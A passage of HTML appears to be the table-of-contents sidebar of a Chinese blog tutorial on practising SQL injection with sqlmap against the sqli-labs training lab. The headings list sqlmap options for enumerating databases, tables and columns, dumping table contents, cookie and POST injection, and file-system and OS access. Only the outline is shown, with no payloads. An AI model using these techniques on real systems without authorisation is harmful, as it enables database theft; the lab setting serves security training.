class="nav-number">1.1.0.4.</span> <span class="nav-text">列出数据库中的列(–column -T 表名 -D 数据库名  若无-D参数则默认当前数据库)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取整某张表的信息-–dump-C-column1，column2-T-tablename-D-databasename"><span class="nav-number">1.1.0.5.</span> <span class="nav-text">获取整某张表的信息(–dump -C column1，column2 -T tablename -D databasename )</span></a></li></ol></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#使用sqli-labs练习社区sqlmap（mysql）"><span class="nav-number">1.</span> <span class="nav-text">使用sqli-labs练习社区sqlmap（mysql）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#工具注入-sqlmap-简单演示"><span class="nav-number">1.1.</span> <span class="nav-text">工具注入(sqlmap)简单演示</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简单测试-u-url"><span class="nav-number">1.1.1.</span> <span class="nav-text">简单测试 (-u url)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#列出数据库系统的数据库-–dbs"><span class="nav-number">1.1.2.</span> <span class="nav-text">列出数据库系统的数据库(–dbs)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#列出数据库表-–tables-D-数据库名，若无-D参数则显示数据库中所有表"><span class="nav-number">1.1.3.</span> <span class="nav-text">列出数据库表(–tables -D 数据库名，若无-D参数则显示数据库中所有表)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#列出数据库中的列-–column-T-表名-D-数据库名-若无-D参数则默认当前数据库"><span class="nav-number">1.1.4.</span> <span class="nav-text">列出数据库中的列(–column -T 表名 -D 数据库名  若无-D参数则默认当前数据库)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取整某张表的信息-–dump-C-column1，column2-T-tablename-D-databasename"><span class="nav-number">1.1.5.</span> <span class="nav-text">获取整某张表的信息(–dump -C column1，column2 -T tablename -D databasename )</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap使用语法大全"><span class="nav-number">1.2.</span> <span class="nav-text">sqlmap使用语法大全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-基础用法："><span class="nav-number">1.2.1.</span> <span class="nav-text">1. 基础用法：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-sqlmap-post注入"><span class="nav-number">1.2.2.</span> <span class="nav-text">2. sqlmap post注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-sqlmap-cookies注入"><span class="nav-number">1.2.3.</span> <span class="nav-text">3.sqlmap  cookies注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-sqlmap遇到url重写的注入"><span class="nav-number">1.2.4.</span> <span class="nav-text">4. sqlmap遇到url重写的注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他基础："><span class="nav-number">1.2.5.</span> <span class="nav-text">其他基础：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#信息获取"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">**信息获取**</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注入分法不同，种类不同，来个简单的分类："><span class="nav-number">1.2.5.2.</span> <span class="nav-text">注入分法不同，种类不同，来个简单的分类：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#例子："><span class="nav-number">1.2.5.3.</span> <span class="nav-text">例子：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#总结下来，帮助文档还是很重要的，多看看，总会有些收获："><span class="nav-number">1.2.5.4.</span> <span class="nav-text">总结下来，帮助文档还是很重要的，多看看，总会有些收获：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMAP中文说明"><span class="nav-number">1.3.</span> <span class="nav-text">SQLMAP中文说明</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#要求："><span class="nav-number">1.3.1.</span> <span class="nav-text">要求：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#优化："><span class="nav-number">1.3.2.</span> <span class="nav-text">优化：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注射："><span class="nav-number">1.3.3.</span> <span class="nav-text">注射：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检测："><span class="nav-number">1.3.4.</span> <span class="nav-text">检测：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#技巧："><span class="nav-number">1.3.5.</span> <span class="nav-text">技巧：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#指纹："><span class="nav-number">1.3.6.</span> <span class="nav-text">指纹：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#枚举："><span class="nav-number">1.3.7.</span> <span class="nav-text">枚举：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#蛮力："><span class="nav-number">1.3.8.</span> <span class="nav-text">蛮力：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用户定义的函数注入："><span class="nav-number">1.3.9.</span> <span class="nav-text">用户定义的函数注入：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件系统的访问："><span class="nav-number">1.3.10.</span> <span class="nav-text">文件系统的访问：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#操作系统访问："><span class="nav-number">1.3.11.</span> <span class="nav-text">操作系统访问：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows注册表的访问："><span class="nav-number">1.3.12.</span> <span class="nav-text">Windows注册表的访问：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#秘书长："><span class="nav-number">1.3.13.</span> <span class="nav-text">秘书长：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#杂项："><span class="nav-number">1.3.14.</span> <span class="nav-text">杂项：</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
